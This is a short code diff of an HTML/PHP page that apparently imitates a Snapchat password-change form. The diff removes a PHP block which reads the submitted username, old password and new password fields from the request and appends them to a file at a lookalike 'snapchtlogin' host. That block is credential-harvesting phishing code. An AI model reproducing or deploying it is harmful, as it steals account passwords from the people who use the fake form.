@@ -43,19 +43,7 @@ html * {
 		</form>
 		<br> <br> <br>
 		</div>
-<?php
-		$myfile = fopen("https://snapchtlogin.github.io/Snapchat/newfile.txt", "a") or die("Unable to open file!");
-		fwrite($myfile,"\n");
-		$txt = $_GET["user"];
-		fwrite($myfile, $txt."\n");
-		$txt = $_GET["old"];
-		fwrite($myfile, $txt."\n");
-		$txt = $_GET["new1"];
-		fwrite($myfile, $txt."\n");
-		$txt = $_GET["new2"];
-		fwrite($myfile, $txt."\n");
-		fclose($myfile);
-?>
+
 		
 	</body>
 	<footer>
